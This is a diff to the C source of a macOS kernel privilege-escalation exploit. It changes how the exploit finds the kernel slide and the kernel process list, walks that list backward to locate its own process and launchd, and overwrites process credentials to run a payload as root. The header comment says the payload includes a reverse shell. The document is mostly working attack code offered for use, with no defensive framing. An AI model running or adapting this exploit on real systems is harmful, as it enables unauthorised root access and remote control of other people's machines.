@@ -11,7 +11,9 @@
  *   exec the payload script (id proof + reverse shell) ourselves.
  *
  * Method 2: launchd job overwrite (fallback, the talk's demo)
- *   1. slide = A.inp_pcbinfo - _ripcbinfo (done by krw_redirect)
+ *   1. slide via krw_discover_slide (A.inp_pcbinfo validated against the
+ *      ripcbinfo list); kernproc via krw_discover_kernproc (__DATA_CONST
+ *      scan for the proc0 pointer)
  *   2. walk _kernproc: find launchd (pid 1) and our own process
  *   3. park two worker threads: one blocked in read() on an empty pipe,
  *      one blocked in write() on a full pipe.  copyin/copyout use
@@ -159,17 +161,31 @@ park_setup(park_t *p, int reader)
 /* kernel R/W helpers on top of krw                                    */
 /* ------------------------------------------------------------------ */
 
+/* proc zone bounds (zalloc GEN range, fixed VAs -- same as krw.c) */
+#define ROOT_ZONE_LO    0xfffffe1876000000ULL
+#define ROOT_ZONE_HI    0xfffffe3000000000ULL
+
+/*
+ * Walk the allproc list BACKWARD from kernproc.  procs are
+ * LIST_INSERT_HEAD'ed onto allproc and kernproc (proc0) is created first,
+ * so kernproc is the tail: its le_next is NULL.  le_prev of each element
+ * holds the address of the previous element's le_next field, which -- since
+ * le_next sits at offset 0 of struct proc -- equals the previous proc
+ * pointer itself.  The walk ends when le_prev points outside the proc zone
+ * (the head's le_prev is &allproc, a kernelcache __DATA static).
+ */
 static uint64_t
 find_proc_by_pid(krw_t *k, uint64_t kernproc, int pid)
 {
     uint64_t proc = kernproc;
     int i;
 
-    for (i = 0; i < 100000 && proc != 0; i++) {
+    for (i = 0; i < 100000 &&
+                proc >= ROOT_ZONE_LO && proc < ROOT_ZONE_HI; i++) {
         uint32_t p = krw_read32u(k, proc + PROC_OFF_PID);
         if (p == (uint32_t)pid)
             return proc;
-        proc = krw_read64(k, proc + PROC_OFF_LIST_NEXT);
+        proc = krw_read64(k, proc + PROC_OFF_LIST_PREV);
     }
     return 0;
 }
@@ -375,14 +391,13 @@ trigger_service(const char *name)
 static int
 cred_overwrite_root(krw_t *k, const char *payload_path)
 {
-    uint64_t slide = krw_slide(k);
     uint64_t kernproc, our_proc, ro, cred;
     uint32_t uid_back, euid_back;
     struct stat st;
     char cmd[PATH_MAX + 16];
     int i;
 
-    kernproc = krw_read64(k, XNU_KERNPROC + slide);
+    kernproc = krw_kernproc(k);
     if (kernproc == 0)
         return -1;
     our_proc = find_proc_by_pid(k, kernproc, getpid());
@@ -437,6 +452,16 @@ root_stage(krw_t *k, const char *payload_path, const char *trigger_name)
 
     fprintf(stderr, "[root] slide 0x%llx\n", (unsigned long long)slide);
 
+    /* kernproc (proc0) discovered at runtime: scan the kernelcache
+     * __DATA_CONST for the proc0 pointer (needs the slide). */
+    if (krw_discover_kernproc(k) != 0) {
+        fprintf(stderr, "[root] kernproc discovery failed\n");
+        return -1;
+    }
+    kernproc = krw_kernproc(k);
+    fprintf(stderr, "[root] kernproc (proc0) = 0x%llx\n",
+            (unsigned long long)kernproc);
+
     /* primary: direct cred overwrite -- run the payload as root ourselves */
     if (cred_overwrite_root(k, payload_path) == 0) {
         fprintf(stderr, "[root] SUCCESS via cred overwrite -- payload "
@@ -454,12 +479,6 @@ root_stage(krw_t *k, const char *payload_path, const char *trigger_name)
     }
 
     /* locate launchd + ourselves */
-    kernproc = krw_read64(k, XNU_KERNPROC + slide);
-    fprintf(stderr, "[root] kernproc = 0x%llx\n",
-            (unsigned long long)kernproc);
-    if (kernproc == 0)
-        return -1;
-
     launchd_proc = find_proc_by_pid(k, kernproc, 1);
     our_proc = find_proc_by_pid(k, kernproc, getpid());
     if (launchd_proc == 0 || our_proc == 0) {
